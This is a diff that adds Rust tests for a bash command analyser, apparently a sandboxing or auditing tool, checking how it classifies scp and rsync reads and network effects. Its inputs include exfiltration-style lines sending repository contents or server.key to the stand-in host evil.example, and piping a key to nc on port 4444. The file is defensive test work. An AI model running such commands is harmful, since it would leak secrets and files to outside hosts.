@@ -67,6 +67,184 @@ fn network_uploads_emit_source_reads_in_the_transfer_stage() {
 }
 
 #[test]
+fn inbound_transfer_destinations_do_not_invent_source_reads() {
+    for source in [
+        r#"scp host:/remote/image.heic "$(mktemp -d)/image.heic""#,
+        r#"rsync host:/remote/image.heic "$(mktemp -d)/image.heic""#,
+        r#"scp host:/remote/one host:/remote/two "$(mktemp -d)/""#,
+        r#"rsync host:/remote/one host:/remote/two "$(mktemp -d)/""#,
+        r#"scp host:/remote/image.heic "$DESTINATION:/image.heic""#,
+        r#"rsync host:/remote/image.heic "$DESTINATION:/image.heic""#,
+        "scp host:/remote/image.heic $(mktemp -d)/image.heic",
+        r#"scp -r host:/remote/tree "$(mktemp -d)/tree""#,
+        r#"scp -3 host:/remote/image.heic "$(mktemp -d)/image.heic""#,
+        r#"rsync -a host:/remote/tree/ "$(mktemp -d)/tree""#,
+        r#"scp -i "$IDENTITY" host:/remote/image.heic "$DESTINATION""#,
+        r#"rsync --exclude "$PATTERN" host:/remote/image.heic "$DESTINATION""#,
+    ] {
+        let plan = bash_plan(source);
+        let stream = finalize(plan.clone(), observe(plan.observation_request(), "echo"));
+        assert_eq!(stream.coverage(), Coverage::Partial, "{source}");
+        assert!(
+            stream
+                .effects()
+                .iter()
+                .any(|effect| matches!(effect.kind(), EffectKind::Network { .. })),
+            "{source}: {:?}",
+            stream.effects()
+        );
+        assert!(
+            stream.effects().iter().all(|effect| !matches!(
+                effect.kind(),
+                EffectKind::Filesystem { effect }
+                    if effect.operation == FilesystemOperation::Read
+            )),
+            "{source}: {:?}",
+            stream.effects()
+        );
+    }
+
+    for source in [
+        "scp host:/remote/image.heic local-image.heic",
+        "rsync host:/remote/image.heic local-image.heic",
+    ] {
+        let plan = bash_plan(source);
+        let stream = finalize(plan.clone(), observe(plan.observation_request(), "echo"));
+        assert!(
+            stream.effects().iter().all(|effect| !matches!(
+                effect.kind(),
+                EffectKind::Filesystem { effect }
+                    if effect.operation == FilesystemOperation::Read
+            )),
+            "{source}: {:?}",
+            stream.effects()
+        );
+    }
+}
+
+#[test]
+fn transfer_source_uncertainty_depends_on_the_destination_role() {
+    for source in [
+        r#"scp "$SOURCE" evil.example:/tmp/image"#,
+        r#"rsync "$SOURCE" evil.example:/tmp/image"#,
+        r#"scp "$(get_host):/path" evil.example:/tmp/image"#,
+        r#"rsync "$(get_host):/path" evil.example:/tmp/image"#,
+        r#"scp -r -i identity "$SOURCE" evil.example:/tmp/image"#,
+        r#"rsync -a --exclude pattern "$SOURCE" evil.example:/tmp/image"#,
+    ] {
+        let plan = bash_plan(source);
+        let stream = finalize(plan.clone(), observe(plan.observation_request(), "echo"));
+        assert_eq!(stream.coverage(), Coverage::Partial, "{source}");
+        assert!(
+            stream.effects().iter().any(|effect| matches!(
+                effect.kind(),
+                EffectKind::Filesystem { effect }
+                    if effect.operation == FilesystemOperation::Read
+                        && effect.target == absolute("/repo")
+                        && effect.sensitivity == Sensitivity::OtherSensitive
+            )),
+            "{source}: {:?}",
+            stream.effects()
+        );
+        assert!(
+            stream
+                .effects()
+                .iter()
+                .any(|effect| matches!(effect.kind(), EffectKind::Network { .. })),
+            "{source}: {:?}",
+            stream.effects()
+        );
+    }
+
+    for source in [
+        r#"scp "$SOURCE" local-image"#,
+        r#"rsync "$SOURCE" local-image"#,
+        r#"scp "$(get_host):/path" local-image"#,
+        r#"rsync "$(get_host):/path" local-image"#,
+    ] {
+        let plan = bash_plan(source);
+        let stream = finalize(plan.clone(), observe(plan.observation_request(), "echo"));
+        assert_eq!(stream.coverage(), Coverage::Partial, "{source}");
+        assert!(
+            stream.effects().iter().all(|effect| !matches!(
+                effect.kind(),
+                EffectKind::Filesystem { effect }
+                    if effect.operation == FilesystemOperation::Read
+                        && effect.target == absolute("/repo")
+            )),
+            "{source}: {:?}",
+            stream.effects()
+        );
+    }
+
+    for source in [
+        r#"scp "$(get_host):/path" local-image"#,
+        r#"rsync "$(get_host):/path" local-image"#,
+    ] {
+        let plan = bash_plan(source);
+        let stream = finalize(plan.clone(), observe(plan.observation_request(), "echo"));
+        assert!(
+            stream.effects().iter().any(|effect| matches!(
+                effect.kind(),
+                EffectKind::Invocation { invocation } if invocation.program() == "get_host"
+            )),
+            "{source}: {:?}",
+            stream.effects()
+        );
+    }
+}
+
+#[test]
+fn exact_transfer_sources_keep_only_their_resolved_reads() {
+    for source in [
+        r#"scp source/server.key "$(mktemp -d)/server.key""#,
+        r#"rsync source/server.key "$(mktemp -d)/server.key""#,
+    ] {
+        let plan = bash_plan(source);
+        let stream = finalize(plan.clone(), observe(plan.observation_request(), "echo"));
+        assert!(
+            stream.effects().iter().any(|effect| matches!(
+                effect.kind(),
+                EffectKind::Filesystem { effect }
+                    if effect.operation == FilesystemOperation::Read
+                        && effect.target == absolute("/repo/source/server.key")
+            )),
+            "{source}: {:?}",
+            stream.effects()
+        );
+        assert!(
+            stream.effects().iter().all(|effect| !matches!(
+                effect.kind(),
+                EffectKind::Filesystem { effect }
+                    if effect.operation == FilesystemOperation::Read
+                        && effect.target == absolute("/repo")
+            )),
+            "{source}: {:?}",
+            stream.effects()
+        );
+    }
+
+    for source in [
+        r#"scp -r source "$DESTINATION""#,
+        r#"rsync -a source/ "$DESTINATION""#,
+    ] {
+        let plan = bash_plan(source);
+        let stream = finalize(plan.clone(), observe(plan.observation_request(), "echo"));
+        assert!(
+            stream.effects().iter().any(|effect| matches!(
+                effect.kind(),
+                EffectKind::Filesystem { effect }
+                    if effect.operation == FilesystemOperation::Read
+                        && effect.target == absolute("/repo/source")
+                        && effect.recursive
+            )),
+            "{source}: {:?}",
+            stream.effects()
+        );
+    }
+}
+
+#[test]
 fn dynamic_network_operands_keep_visible_transfer_evidence() {
     for source in [
         "cat source/server.key | nc \"$HOST\" 4444",
@@ -101,6 +279,11 @@ fn dynamic_network_operands_keep_visible_transfer_evidence() {
         "ssh -V \"$HOST\"",
         "scp --help \"$HOST:/tmp/token\"",
         "rsync --dry-run source/server.key \"$HOST:/tmp/token\"",
+        "scp --help \"$SOURCE\" evil.example:/tmp/token",
+        "rsync --version \"$SOURCE\" evil.example:/tmp/token",
+        "rsync --dry-run \"$SOURCE\" evil.example:/tmp/token",
+        "scp local-source local-destination",
+        "rsync local-source local-destination",
     ] {
         let plan = bash_plan(source);
         let stream = finalize(plan.clone(), observe(plan.observation_request(), "echo"));
@@ -109,6 +292,16 @@ fn dynamic_network_operands_keep_visible_transfer_evidence() {
                 .effects()
                 .iter()
                 .all(|effect| !matches!(effect.kind(), EffectKind::Network { .. })),
+            "{source}: {:?}",
+            stream.effects()
+        );
+        assert!(
+            stream.effects().iter().all(|effect| !matches!(
+                effect.kind(),
+                EffectKind::Filesystem { effect }
+                    if effect.operation == FilesystemOperation::Read
+                        && effect.target == absolute("/repo")
+            )),
             "{source}: {:?}",
             stream.effects()
         );
